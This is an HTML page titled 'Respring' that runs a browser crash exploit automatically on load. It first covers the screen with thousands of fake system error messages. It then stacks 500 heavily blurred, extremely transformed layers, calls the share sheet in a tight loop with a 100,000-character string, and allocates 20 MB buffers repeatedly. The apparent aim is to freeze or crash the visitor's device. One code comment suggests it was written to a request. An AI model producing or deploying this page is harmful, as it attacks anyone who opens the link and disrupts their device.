<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Respring</title>
    <style>
        body {
            background: #450a0a;
            color: #ffffff;
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: 'JetBrains Mono', monospace;
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
            align-content: flex-start;
            height: 100vh;
            width: 100vw;
            position: relative;
        }

        /* Dynamic Red Mist */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background: radial-gradient(circle at 50% 50%, rgba(220, 38, 38, 0.15) 0%, transparent 70%);
            animation: mistShift 10s ease-in-out infinite alternate;
            pointer-events: none;
            z-index: 1;
        }

        /* Static/Grain Overlay */
        body::after {
            content: '';
            position: fixed;
            inset: -200%;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
            opacity: 0.15;
            pointer-events: none;
            animation: noise 0.2s steps(2) infinite;
            z-index: 2;
        }

        @keyframes mistShift {
            0% { transform: scale(1) translate(-2%, -2%); }
            100% { transform: scale(1.2) translate(2%, 2%); }
        }

        @keyframes noise {
            0% { transform: translate(0,0); }
            10% { transform: translate(-5%,-5%); }
            20% { transform: translate(-10%,5%); }
            30% { transform: translate(5%,-10%); }
            40% { transform: translate(-5%,15%); }
            50% { transform: translate(-10%,5%); }
            60% { transform: translate(15%,0); }
            70% { transform: translate(0,10%); }
            80% { transform: translate(-15%,0); }
            90% { transform: translate(10%,5%); }
            100% { transform: translate(5%,0); }
        }

        .error-msg {
            font-size: 6px;
            opacity: 0.4;
            white-space: nowrap;
            user-select: none;
            padding: 1px;
            position: relative;
            z-index: 0;
        }
    </style>
</head>
<body>
    <script>
        // Fill background with small error messages - extreme density
        const errorTemplates = [
            "Fatal Error 0x3333",
            "Entering Bootloop...",
            "KERNEL_PANIC",
            "OVERFLOW_DETECTION",
            "STACK_COLLISION",
            "MEMORY_CORRUPTION",
            "0xFFFF_SYSTEM_HALT",
            "CRITICAL_PROCESS_DIED",
            "THREAD_STUCK_IN_DEVICE_DRIVER",
            "BOOT_LOOP_DETECTED",
            "FS_CORRUPTION",
            "SYSTEM_FREEZE",
            "HARDWARE_MALFUNCTION"
        ];
        
        // Generating even more elements for microscopic density
        for(let i=0; i<5000; i++) {
            const span = document.createElement('span');
            span.className = 'error-msg';
            span.innerText = errorTemplates[Math.floor(Math.random() * errorTemplates.length)];
            document.body.appendChild(span);
        }

        // Execute after a delay to show the error UI first
        function startExploit() {
            setTimeout(() => {
                const container = document.createElement('div');
                container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                document.body.appendChild(container);

                for (let i = 0; i < 500; i++) {
                    let d = document.createElement('div');
                    d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99; pointer-events: none;';
                    container.appendChild(d);
                }

                setInterval(() => {
                    try {
                        navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                    } catch(e) {}
                    let x = new Uint8Array(1024 * 1024 * 20);
                    crypto.getRandomValues(x);
                }, 0);
            }, 200); // 200ms delay as requested
        }

        // Start immediately on load (will trigger timeout)
        window.onload = startExploit;
    </script>
</body>
</html>
